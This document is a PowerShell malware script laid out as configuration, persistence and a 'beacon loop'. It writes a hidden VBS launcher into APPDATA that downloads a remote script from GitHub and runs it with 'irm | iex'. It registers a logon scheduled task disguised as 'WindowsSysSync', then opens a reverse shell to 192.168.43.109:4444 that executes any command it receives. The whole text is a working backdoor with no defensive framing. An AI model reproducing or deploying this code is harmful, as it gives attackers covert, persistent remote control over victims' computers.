# --- 1. CONFIGURATION ---
$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"
$LHOST = "192.168.43.109"
$LPORT = 4444

# --- 2. PERSISTENCE (Silent Task) ---
$VBSPath = "$env:APPDATA\win_sys_helper.vbs"
$VBSCode = "Set W=CreateObject('WScript.Shell'):W.Run 'powershell -NoP -W Hidden -E Bypass -C irm $Url | iex',0,False"
if (!(Test-Path $VBSPath)) { Set-Content -Path $VBSPath -Value $VBSCode -Force }

if (!(Get-ScheduledTask -TaskName "WindowsSysSync" -ErrorAction SilentlyContinue)) {
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VBSPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsSysSync" -Action $Action -Trigger $Trigger -Force
}

# --- 3. THE BEACON LOOP ---
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
        $writer.WriteLine("--- GHOST ONLINE ---")
        $reader = New-Object System.IO.StreamReader($stream)
        while($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $line = $reader.ReadLine()
            if ($null -eq $line -or $line -eq "exit") { break }
            $out = (IEX $line 2>&1 | Out-String)
            $writer.WriteLine($out)
        }
        $client.Close()
    }
    catch { Start-Sleep -Seconds 10 }
}
